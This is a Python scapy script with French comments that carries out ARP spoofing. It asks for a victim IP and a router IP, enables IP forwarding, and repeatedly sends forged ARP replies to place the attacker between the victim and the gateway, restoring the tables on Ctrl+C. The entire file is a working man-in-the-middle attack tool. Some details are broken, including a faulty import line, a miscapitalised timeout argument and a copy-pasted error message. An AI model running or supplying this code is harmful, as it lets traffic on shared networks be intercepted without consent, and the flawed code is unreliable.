from scapy.all import all
import sys
import os
import time


# Ici, nous avons demandé à l'utilisateur une interface, l'adresse IP de la victime et l'adresse IP du routeur. Nous avons ajouté une exception au cas où l'utilisateur ne souhaite pas continuer. Nous avons également activé le transfert IP pour l'utilisateur afin qu'il ne soit pas obligé de le faire.
try:

    interface = input("[*] Entrer Desired Interface: ")
    victimeIP = input("[*] Entrer Victime IP: ")
    gateIP = input("[*] Entrer router IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

print("\n [*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


# Dans l'extrait de code ci-dessus, nous envoyons une demande ARP avec la destination choisie par l'utilisateur. Nous utiliserons cette fonction ultérieurement dans notre script.
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),
                     Timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# Dans cette fonction, nous appelons notre fonction get-mac () créée précédemment pour rechercher les adresses MAC. Une fois que nous les aurons, les réponses seront envoyées pour indiquer aux systèmes l'emplacement de l'autre système. Nous vous enverrons chaque réponse sept fois pour faire bonne mesure. Une fois cela fait, nous allons désactiver le transfert IP pour l'utilisateur.
def reARP():

    print("\n[*] Restoring Targets...")
    victimeMAC = get_mac(victimeIP)
    getMAC = get_mac(gateIP)
    send(ARP(op=2, pdst=gateIP, psrc=victimeIP,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimeMAC), count=7)
    send(ARP(op=2, pdst=victimeIP, psrc=gateIP,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=getMAC), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


# Cette fonction envoie simplement une seule réponse ARP à chacune des cibles en leur disant que nous sommes l'autre cible, en nous plaçant entre elles.
def trick(gm, vm):
    send(ARP(op=2, pdst=victimeIP, psrc=gateIP, hwdst=vm))
    send(ARP(op=2, pdst=gateIP, psrc=victimeIP, hwdst=gm))


# Ici, nous essayons d’obtenir les adresses MAC de la victime et du routeur, c’est en cas de panne. Nous ne souhaitons pas envoyer de paquets à l'un ni à l'autre. Par conséquent, si nous ne trouvons aucun d'entre eux, nous désactivons le transfert IP et arrêtons le script. Si nous pouvons obtenir l'adresse MAC, nous pouvons commencer à envoyer nos réponses. Nous faisons cela en faisant un tout en boucle et en envoyant une autre série de réponses toutes les 1,5 secondes. Une fois que l'utilisateur a donné une interruption au clavier (Ctrl + C), nous avons appelé la fonction reARP () pour réaffecter les cibles et fermer le script.
def mitm():
    try:
        victimeMAC = get_mac(victimeIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(gateMAC, victimeMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break


mitm()
